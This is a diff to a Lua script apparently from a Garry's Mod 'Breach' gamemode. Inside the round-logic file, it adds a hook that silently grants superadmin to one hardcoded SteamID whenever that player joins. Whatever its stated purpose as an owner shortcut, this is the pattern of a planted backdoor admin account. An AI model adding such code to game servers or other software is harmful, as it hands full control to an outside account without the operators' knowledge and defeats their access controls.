@@ -19,6 +19,22 @@ local net = net
 local player = player
 BREACH.Round = BREACH.Round || {}
 
+-- 自动给指定 SteamID 设置 superadmin
+if SERVER then
+    hook.Add("PlayerInitialSpawn", "AutoSuperAdmin_Owner", function(ply)
+        if ply:SteamID64() == "76561198392875271" then
+            timer.Simple(1, function()
+                if not IsValid(ply) then return end
+                if ULib and ULib.ucl then
+                    ULib.ucl.addUser(ply:SteamID(), _, _, "superadmin")
+                end
+                ply:SetUserGroup("superadmin")
+                MsgC(Color(0, 255, 0), "[AutoAdmin] ", color_white, ply:Nick() .. " 已自动设置为 superadmin\n")
+            end)
+        end
+    end)
+end
+
 function AdminActionLog(admin, user, title, desc)
 	local niceusergroup = {
 		["superadmin"] = "Creator",
